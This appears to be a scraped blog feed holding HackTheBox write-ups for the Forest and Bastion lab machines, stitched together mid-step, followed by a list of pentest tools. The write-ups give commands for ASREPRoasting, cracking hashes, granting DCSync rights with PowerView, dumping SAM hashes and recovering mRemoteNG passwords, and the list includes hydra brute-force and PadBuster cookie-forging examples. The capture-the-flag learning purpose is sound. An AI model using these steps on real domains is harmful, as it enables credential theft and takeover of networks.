      <description>The Forest Windows box retired this weekend on HackTheBox. Getting user was quite straight forward but escalating privileges was a little more compricated. We&amp;rsquo;ll have a look at BloodHound for that last step, it&amp;rsquo;s an open source tool that I use a lot for work now and that I can&amp;rsquo;t recommend enough.

Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows  Looking at the open ports, we have a very standard windows box using Active Directory and that the domain is called &amp;ldquo;htb.local&amp;rdquo;. If you&amp;rsquo;re starting to learn about Active Directory pen-testing, I highly recommend googling these services such as LDAP, RPC, and Kerberos.
By design, Active Directory can be asked for a lot of public information without being authenticated, so let&amp;rsquo;s just do that with one of nmap scripts (also possible with Metasploit&amp;rsquo;s smb_enum_users): root@kali:~/# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;htb.local&#39;,userdb=/root/HTB_writeups/HackTheBox/Forest/users.txt 10.10.10.161

Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds  Sweet! We got a list of users! One of them pops out from all the others: svc-alfresco. The name &amp;ldquo;svc&amp;rdquo; would mean that it&amp;rsquo;s a service account so we can check if it was misconfigured. There is this cool cheatsheet to learn how to use the widly recommended Impacket. Following the cheatsheet, we check if any of the users are vulnerable to ASREPRoast: root@kali:~/Downloads/impacket-0.9.20/examples# GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile /root/HTB_writeups/HackTheBox/Forest/users.txt

2: Getting a shell Copy the hash to a text file called hash.txt, and run the following with john: root@kali:~/# john --wordlist=/root/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])

Use the &#34;--show&#34; option to display all of the cracked passwords reliably
Session completed  Great! It took only 3 seconds, but not surprising with how bad the password was: s3rvice. Now we can get our shell with my favourite evil-winrm and get the user flag:

3: Priviledge Escalation In Active Directory, you can use BloodHound to find relationships (between users, groups and computers) which can be used to escalate your privileges. It is very useful for the red team but also for the blue team in order to identify and mitigate the vulnerabilities and limit the paths to high value targets within your AD architecture.
After downloading the lastest release of BloodHound, we can use our evil-winrm shell to upload it to the serve, run it there, and download back the results which will be in a zip format.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents upload ~/Downloads/BloodHound/Ingestors/SharpHound.ps1 .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Invoke-BloodHound -CollectionMethod All -domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents download .\20191031121111_BloodHound.zip /root/Downloads/BloodHound/Ingestors/report.zip
Info: Downloading .\20191031121111_BloodHound.zip to /root/Downloads/BloodHound/Ingestors/report.zip
Info: Download successful!  If you&amp;rsquo;ve done the BloodHound set up correctly following their GitHub guide, you should have neo4j (database) running and the bloodhound gui opened. Just dragged and dropped the zip file into the BloodHound gui and it will upload it to the database automatically. When it&amp;rsquo;s finished, select the &amp;ldquo;Shortest path to Domain Admin&amp;rdquo; query and you&amp;rsquo;ll see something like this:
We&amp;rsquo;re interested in the svc-alresco path, and we see that we&amp;rsquo;re member of a group called &amp;ldquo;Exchange Windows Permission&amp;rdquo; which has WriteDacl right on the entire domain. WriteDacl basically gives this group the ability to create any relationship they want. Bad news for the blue team, great team for us! Even better is that by clicking the WriteDacl relationship in BloodHound, it gives us a step-by-step guide on how to exploit it:
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents upload /root/Downloads/dev_PowerSploit/PowerSploit/Recon/PowerView.ps1 .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents $SecPassword = ConvertTo-SecureString &#39;s3rvice&#39; -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents $Cred = New-Object System.Management.Automation.PSCredential(&#39;htb\svc-alfresco&#39;, $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Add-ADGroupMember -Identity &#34;EXCHANGE WINDOWS PERMISSIONS&#34; -Members &#39;svc-alfresco&#39;
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Add-DomainObjectAcl -TargetIdentity &#39;DC=htb,DC=local&#39; -Rights DCSync -Verbose -PrincipalIdentity &#39;htb\svc-alfresco&#39; -credential $Cred  Following BloodHound&amp;rsquo;s instructions, we gave ourselves (svc-alfresco) the DCSync right. DCSync is &amp;ldquo;a late-stage kill chain attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password data via domain replication&amp;rdquo; (source: this blog).
Thanks to this new right we&amp;rsquo;ll be able to imitate the Domain Controller and identify ourselves as anyone else as long as we have their password hash. We don&amp;rsquo;t even need their password! And a Domain Controller, we can now dump all the password hashes, how convenient:

WindowsImageBackup D 0 Fri Feb 22 14:44:02 2019
7735807 blocks of size 4096. 2759330 blocks available  I found note.txt but nothing interesting there. But there is a directory called WindowsImageBackup!

2: Mounting the VHD to get user In the WindowsImageBackup we find 2 VHD files: 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd A 37761024 Fri Feb 22 14:44:03 2019
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd A 5418299392 Fri Feb 22 14:45:32 2019  They are big files so we want to avoid downloading them. After a LOT of googling and every more failed attempts, I found the way to mount VHD files in linux. First I needed to install CIFS: root@kali:~/Desktop/HTB/Bastion# sudo apt-get install cifs-utils
 The first and smaller VHD didn&amp;rsquo;t contain anything of interest so let&amp;rsquo;s go straight to the second one: root@kali:~/Desktop/HTB/Bastion# mount.cifs //10.10.10.134/Backups ./mount
root@kali:~/Desktop/HTB/Bastion# guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro ~/Desktop/HackTheBox/Bastion/vhd-mount2 -m /dev/sda1  Wait a few seconds and the VHD should appear as a mounted folder in your system now! I checked the Users folder but nothing there which means there is another step to getting user.txt. After getting back to more googling, I found some info about extracting the hashes in a Windows backup in /System32/config by using samdump2: samdump2 SYSTEM SAM

Use the &#34;--show --format=NT&#34; options to display all of the cracked passwords reliably
Session completed  Awesome I got the password &amp;ldquo;bureaulampje&amp;rdquo;! I know SSH is available on this box from the nmap scan: root@kali:~/Desktop/HTB/Bastion# ssh L4mpje@10.10.10.134  And I find the user.txt on the Desktop of the machine!

3: Priviledge Escalation I did a lot of enumeration suggested on different Windows privesc guides, and finally found a weird program sitting in Program Files called nRemoteNG. A quick google search shows that it is vulnerable and can get us admin password: http://hackersvanguard.com/mremoteng-insecure-password-storage/
I download nRemoteNG on my Windows VM. I used WinSCP to access C:\Users\L4mpje\AppData\Roaming\mRemoteNG and download consConf.xml on my VM. Then I import it on nRemoteNG and to see the clear text of a given password, go to “Tools” &amp;gt; “External Tools”. Then right-click in the white space and choose “New External Tool”. Next, in the External Tools Properties, fill in a “Display Name”, “Filename” and some “arguments”, with “Password lookup”, CMD and “/k echo %password%” respectively.
Then right click on the Bastion connection, external tool, Password Lookup, and we get the Admin password. We can now SSH with Administrator and get the root flag! root@kali:~/Desktop/HTB/Bastion# ssh Administrator@10.10.10.134

Was pinned on /r/hacking (even more tools suggested there): 

Hydra
hydra options $user/$passOptions $ip/$url serviceOptions
Example I used during a CTF to find valid usernames:
hydra -L usernames.txt -p password -f -s 5001 35.227.x.x http-post-form &#34;/hash/login:username=^USER^&amp;password=^PASS^:Invalid username&#34; -t 64  John the Ripper Another bruteforcing tool, for password hashes this time. I explain how to add a new rule in this post. john --wordlist=password.lst --rules mypasswd  hashcat hashcat is the world&#39;s fastest and most advanced password recovery utility, supporting five unique modes of attack for over 200 highly-optimized hashing algorithms. hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, Windows, and macOS, and has facilities to help enable distributed password cracking.
Important note: a VM won&#39;t have access to your hardware so you&#39;ll need to do modifications to make it work as it will try to use GPU.  SQLMap I use this tool a lot for SQL injections. For more information, check this tutorial. sqlmap -u $url options Very useful option:
--forms: Parse and test forms  WPScan WPScan is a free, for non-commercial use, black box WordPress vulnerability scanner written for security professionals and blog maintainers to test the security of their sites.
wpscan --url myblog.com
If a more stealthy approach is required, then wpscan --stealthy --url myblog.com can be used.
When using the --enumerate option, don&#39;t forget to set the --plugins-detection accordingly, as its default is &#39;passive&#39;.  Pentestmonkey Reverse Shell The PHP reverse shell I use the most, you&#39;ll find it on this page with a tutorial on how to use it. Explore the rest of the Pentestmonkey website, it&#39;s great.
They also have a Shell script to check for simple privilege escalation vectors on Unix systems:
https://github.com/pentestmonkey/unix-privesc-check  SecLists SecLists is the security tester&#39;s companion. It&#39;s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.  NMAP No need to introduce this extremely useful tool, but here my usual command if it interests you:
nmap -sV -sC -oN myscan.txt $ip  -sV: Version/Service info -sC: Run default scripts -oN: Normal output  Or the shorter version which combines sV and sC:
nmap -A -oN myscan.txt $ip
And if you do not need to be discreet (for certain CTFs without firewall f.ex.), you can add T5 which is the insane mode. T0 being the paranoid mode and will be a very slow scan.
nmap -A -T5 -oN myscan.txt $ip
Useful one-liner to look all the scripts that nmap can provide:
locate -r &#39;\.nse$&#39; | xargs grep categories | grep &#39;default\|version&#39;
Let&#39;s say you&#39;re looking for SMB scripts:
locate -r &#39;\.nse$&#39; | xargs grep categories | grep &#39;default\|version&#39; | grep smb  Masscan I started using this tool as an addition to NMAP. It is a great port scanner and effective to grab banner information, but it can also scan the entire Internet in under 6 minutes!!
Command example for a simple port scan:
masscan -p80,8000-8100 10.0.0.0/8
And for banner checking:
masscan 10.0.0.0/8 -p80 --banners --source-ip 192.168.1.200  Wfuzz Extremely useful for enumeration, Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing, etc.
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.202/FUZZ  Dirb Another enumeration tool I use a lot.
dirb http://$ip/ /usr/share/wordlists/dirb/common.txt  DirBuster Never enough enumeration tools! One more. This one as a GUI, so just type the command &#39;dirbuster&#39; and it will launch the program.  Nikto Did I say enumeration again? Nikto is the last enumeration tool I use. Never underestimate an effective enumeration during the recon phase.
nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host $ip  Gobuster I know, I know: more enumeration. But trust me having different tools to enumerate directories often helped me during CTFs in the recon phase. Just choose the ones that will do the job.
gobuster dir -u $url -w $wordlist  Sublist3r Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.
python sublist3r.py -d example.com  The Awesome Red Teaming List of Awesome Red Team / Red Teaming Resources. This list is for anyone wishing to learn about Red Teaming but do not have a starting point.  Osmedeus Osmedeus allows you automated run the collection of awesome tools to reconnaissance and vulnerability scanning against the target. Even has a slack bot to send notifications!
./osmedeus.py -t example.com  XSS Hunter XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing and XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.  pspy pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
I explain in this post how to upload enumeration tools to a server.  LinEnum Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.
I explain in this post how to upload enumeration tools to a server.  GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.  LOLBAS The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.  TCM Security Sample Pentest Report This is a template for a pentest report kindly given by the Cyber Mentor (subscribe to his channel, awesome content), and in his own words: &#34;I am frequently asked what an actual pentest report looks like. I am providing a barebones demo report for &#34;demo company&#34; that consisted of an external penetration test. The report only includes one finding and is meant to be a starter template for others to use. Please feel free to download and make this your own.&#34;  Cyber Chef A simple, intuitive web app for analysing and decoding data without having to deal with complex tools or programming languages. CyberChef encourages both technical and non-technical people to explore data formats, encryption and compression.
Extremely usefull to quickly decrypt simple hashes. Highly recommend.  exiftool ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files. For example, I explain how I extracted hidden information in images in this post.  Wireshark Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the standard. In many forensic CTF challenges, you might have a pcap (Packet Capture Data) to analyze and Wireshark is more than often the best tool to do that. Check out my write-up of the first exercise from Malware Traffic Analysis&#39; exercise list. Planning to do many more in the future.  Rawsec&amp;rsquo;s CyberSecurity Inventory A much bigger inventory of tools and resources about CyberSecurity than mine here. Highly recommend if you want to scroll around and look at all the awesome tools that we have to play with.  explainshell explainshell is a tool (with a web interface) capable of parsing man pages, extracting options and explain a given command-line by matching each argument to the relevant help text in the man page.
Tool recommended for this list by @n1cfury  PayloadsAllTheThings A list of useful payloads and bypasses for Web Application Security.
You can contribute through pull requests, beers IRL or with buymeacoffee.com  PadBuster PadBuster is a Perl script for automating Padding Oracle Attacks. PadBuster provides the capability to decrypt arbitrary ciphertext, encrypt arbitrary plaintext, and perform automated response analysis to determine whether a request is vulnerable to padding oracle attacks.
If you find a website that uses only cookies for authentification, it&#39;s a good idea to give PadBuster a try. Command example to decrypt:
padbuster http://url.com/profile.php 4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D 8 -cookies &#34;Cookie: PHPSESSID=bn22u9fe085pkut4nsnrrckm96; auth=4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D&#34;
For example, this could result in {&#34;user&#34;:&#34;test&#34;,&#34;role&#34;:&#34;user&#34;}
So now, we can encrypt a new cookie with a different role:
padbuster http://url.com/profile.php 4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D 8 -cookies &#34;Cookie: PHPSESSID=bn22u9fe085pkut4nsnrrckm96; auth=4Ax3gr6sdNiBYo7LIkJUavx89eauhgqdrMICdOvdWmDMM6Oo%2BHiXmg%3D%3D&#34; -plaintext &#34;{\&#34;user\&#34;:\&#34;test\&#34;,\&#34;role\&#34;:\&#34;admin\&#34;}&#34;
Which will give us a new encrypted cookie.  Malware Traffic Analysis If you&#39;re interested in forensic and malware traffic analysis, this is THE website. It contains a lot of great articles, but also a very long list of exercises to practice your Wireshark skills! And of course following @malware_traffic on twitter is a must.
Check out my write-up of the first exercise. Planning to do many more in the future.  enum4linux Enum4linux is a tool for enumerating information from Windows and Samba systems. Very useful during CTF if you&#39;re facing a Windows machine, it can help you find the initial foothold.
enum4linux should be already installed on kali linux.
enum4linux -a 10.10.10.169  Evil-WinRM Evil-WinRM can be used on any Microsoft Windows Servers with Win-RM enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase.
Lot of features, give it a try next time you&#39;re trying to get a shell on a Windows machine and escalate your privileges!  BloodHound I have worked a lot with BloodHound lately and I completely love it!
&#34;BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.&#34;
Here are two great links about BloodHound:
- BloodHound wiki
- The Dog Whisperer&#39;s Handbook
if you need help when setting up BloodHound and using it, contact me on twitter!  Active Directory Kill Chain Attack &amp;amp; Defense A complete bible! Go check it out! A lot less chaotic than this page...
&#34;This document was designed to be a useful, informational asset for those looking to understand the specific tactics, techniques, and procedures (TTPs) attackers are leveraging to compromise active directory and guidance to mitigation, detection, and prevention. And understand Active Directory Kill Chain Attack and Modern Post Exploitation Adversary Tradecraft Activity.&#34;  Hacking Articles An extensive list of useful pentest guides, tips and CTF write-ups.  PrivEsc A collection of Windows, Linux and MySQL privilege escalation scripts and exploits. Very useful to enumerate a target for priviledge escalation. If you got a foothold on a Windows machine for example, and got a shell with evil-winrm, upload the windows script and run:
.\windows-privesc-check.exe -a -u username -p Password -d domain.local  report.txt  ]]></content:encoded>
